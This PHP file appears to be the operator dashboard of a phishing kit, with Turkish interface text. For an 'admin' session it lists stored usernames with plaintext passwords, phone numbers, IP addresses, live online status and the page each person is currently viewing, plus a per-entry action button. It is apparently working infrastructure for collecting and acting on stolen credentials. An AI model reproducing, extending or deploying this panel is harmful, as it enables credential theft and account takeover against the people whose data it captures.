<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['sec-username']) || $_SESSION['sec-username'] !== 'admin') {
    echo json_encode(['error' => 'Unauthorized access']);
    exit();
}

include('./config.php');
ini_set('display_errors', 0);


try {
    $result = $mysqli->query("SELECT * FROM users ORDER BY id DESC");

    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $ip = htmlspecialchars($row['ip']);
            $uniqueId = 'dropdown-' . htmlspecialchars($row['id']);
            echo '
                <tr>
                    <td style="color: lightgreen;">' . htmlspecialchars($row['id']) . '</td>
                    <td style="color: lightgreen;max-width: 45px;font-size: 14px;font-weight: 400;font-style: normal;">' . htmlspecialchars($row['date']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['username']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['password']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['phonecode']) . '</td>
					<td style="color: #28FF0F;">' . htmlspecialchars($row['phone']) . '</td>
                    <td style="color: #aaaaaa; font-size: 16px; text-align: center;max-width: 80px">' . htmlspecialchars($row['ip']) . ($row['last_activity'] > time() ? '🟢' : '🔴') . '</td>
                    <td style="color: lightgreen; text-transform: uppercase;max-width: 60px;">' . htmlspecialchars($row['page']) . '</td>
                    <td class="text-end" style="max-width: 70px;">
                    <a href="#" class="btn btn-sm btn-warning btn-flex btn-center btn-active-light-primary sweetalert-button" data-ip="' . $ip . '" data-id="' . $row['id'] . '" style="  color: #ffffff;
                    font-weight: 700;
                    font-style: normal;
                    text-transform: uppercase;width: 95%;">
                        <i class="fa-solid fa-bolt">
                        </i> ISLEM </a>
                    </td>
                </tr>'
            ;
        }
    } else {
        echo '<tr><td colspan="10">Veri bulunamadı.</td></tr>';
    }
} catch (Exception $e) {
    echo 'Hata: ' . $e->getMessage();
}

$mysqli->close();
